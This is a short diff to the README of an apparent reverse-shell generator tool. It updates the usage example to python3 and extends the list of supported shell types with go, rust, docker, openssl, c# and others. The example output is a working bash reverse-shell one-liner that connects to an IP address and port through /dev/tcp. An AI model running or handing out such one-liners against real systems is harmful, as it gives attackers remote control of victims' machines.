@@ -28,13 +28,15 @@ shell - Type of script you need
 
 **Example:**
 
-python script.py bash 192.168.1.100 4444
+python3 script.py bash 192.168.1.100 4444
 
 output:
 
 /bin/bash -i >& /dev/tcp/192.168.1.100/4444 0>&1
 
 **Other shell types that can be generated include:**
+
+bash
 
 socat
 
@@ -49,3 +51,35 @@ nc.exe
 ruby
 
 perl
+
+go
+
+elixir
+
+lua
+
+rust
+
+haskell
+
+d
+
+swift
+
+zsh
+
+docker
+
+vim
+
+android
+
+c
+
+bash_timeout
+
+openssl
+
+tcl
+
+c#
